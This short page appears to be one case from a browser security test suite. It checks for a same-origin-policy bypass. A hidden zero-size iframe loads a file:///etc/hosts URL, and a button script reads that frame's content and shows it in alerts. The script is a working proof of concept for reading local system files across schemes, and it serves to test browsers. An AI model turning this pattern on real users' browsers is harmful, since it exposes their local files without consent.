---
layout: default
title: SOP Bypass - Testcase 10
permalink: /sop/new/10
---

# SOP Bypass - Testcase 10

Cross Scheme data exposure for bypassing SOP

<input type="button" id="btn_test" class="test" value="Run Test Case" onclick="myfunction()">
<iframe src="https://web.archive.org/web/20180831120301if_/file:///etc/hosts" name="myIframe" width="0px" height="0px" data-ruffle-polyfilled=""></iframe>
<script>
function myfunction() {
    var myIframe = frames.myIframe;
    var fenster = window.frames[0];
    var message = fenster.document.getElementsByTagName("pre")[0].childNodes[0].nodeValue;
    var messages = message;
    messages = messages.replace(/#/g, "");
    alert(messages);
    alert(window.frames['myIframe'].document.getElementsByTagName('pre')[0].innerHTML);
}
</script>

**Note:**
In case of a cross scheme exposure, the contents of /etc/hosts file would be displayed.
